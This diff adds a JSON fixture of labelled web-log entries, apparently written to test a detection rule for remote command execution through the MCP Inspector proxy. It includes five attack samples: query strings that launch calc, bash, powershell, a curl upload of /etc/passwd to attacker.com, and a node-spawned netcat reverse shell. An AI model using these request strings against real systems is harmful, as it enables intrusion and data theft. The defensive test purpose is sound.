@@ -1,0 +1,162 @@
+[
+    {
+        "description": "Malicious RCE attempt via MCP Inspector - Calculator execution",
+        "log_entry": {
+            "timestamp": "2025-01-09T10:30:15Z",
+            "c-ip": "192.168.1.100",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=calc.exe",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "localhost:6277"
+        },
+        "should_trigger": true,
+        "attack_type": "Browser-based RCE via 0.0.0.0-day"
+    },
+    {
+        "description": "DNS Rebinding attack executing bash commands",
+        "log_entry": {
+            "timestamp": "2025-01-09T10:35:22Z",
+            "c-ip": "127.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=bash&args=-c+whoami",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "dyn.attacker.com"
+        },
+        "should_trigger": true,
+        "attack_type": "DNS Rebinding with command execution"
+    },
+    {
+        "description": "PowerShell execution attempt from external IP",
+        "log_entry": {
+            "timestamp": "2025-01-09T10:40:18Z",
+            "c-ip": "203.0.113.42",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=powershell&args=-c+Get-Process",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "curl/7.68.0",
+            "cs-host": "victim.example.com"
+        },
+        "should_trigger": true,
+        "attack_type": "Direct external exploitation"
+    },
+    {
+        "description": "Data exfiltration attempt using curl",
+        "log_entry": {
+            "timestamp": "2025-01-09T10:45:33Z",
+            "c-ip": "10.0.0.50",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=curl&args=https://attacker.com/exfil -d @/etc/passwd",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+            "cs-host": "localhost"
+        },
+        "should_trigger": true,
+        "attack_type": "Data exfiltration via curl"
+    },
+    {
+        "description": "Node.js script execution for persistence",
+        "log_entry": {
+            "timestamp": "2025-01-09T10:50:12Z",
+            "c-ip": "192.168.1.150",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=node&args=-e+require('child_process').spawn('nc',['attacker.com','4444','-e','/bin/bash'])",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+            "cs-host": "127.0.0.1"
+        },
+        "should_trigger": true,
+        "attack_type": "Reverse shell establishment"
+    },
+    {
+        "description": "Legitimate MCP Inspector usage - valid MCP server test",
+        "log_entry": {
+            "timestamp": "2025-01-09T09:15:45Z",
+            "c-ip": "127.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=python&args=mcp_server.py",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "localhost"
+        },
+        "should_trigger": true,
+        "attack_type": "Legitimate but detected due to python command (may be false positive)"
+    },
+    {
+        "description": "Normal web application traffic - API endpoint",
+        "log_entry": {
+            "timestamp": "2025-01-09T09:20:33Z",
+            "c-ip": "192.168.1.25",
+            "cs-method": "GET",
+            "c-uri-path": "/api/users",
+            "c-uri-query": "page=1&limit=10",
+            "cs-uri-port": 3000,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "app.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal application traffic"
+    },
+    {
+        "description": "Health check endpoint access",
+        "log_entry": {
+            "timestamp": "2025-01-09T09:25:11Z",
+            "c-ip": "10.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/health",
+            "c-uri-query": "",
+            "cs-uri-port": 8080,
+            "sc-status": 200,
+            "cs-user-agent": "kube-probe/1.21",
+            "cs-host": "service.cluster.local"
+        },
+        "should_trigger": false,
+        "attack_type": "Infrastructure monitoring"
+    },
+    {
+        "description": "Static file serving",
+        "log_entry": {
+            "timestamp": "2025-01-09T09:30:28Z",
+            "c-ip": "203.0.113.10",
+            "cs-method": "GET",
+            "c-uri-path": "/assets/main.js",
+            "c-uri-query": "v=1.2.3",
+            "cs-uri-port": 80,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
+            "cs-host": "cdn.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Static content delivery"
+    },
+    {
+        "description": "MCP Inspector UI access - legitimate developer activity",
+        "log_entry": {
+            "timestamp": "2025-01-09T09:10:15Z",
+            "c-ip": "127.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/",
+            "c-uri-query": "MCP_PROXY_AUTH_TOKEN=03b238d87a33aa56033344589ed2ae01cde3dfd9d396a51548bfc9b6cdfd8299",
+            "cs-uri-port": 6274,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "localhost"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate MCP Inspector UI access with auth token"
+    }
+]
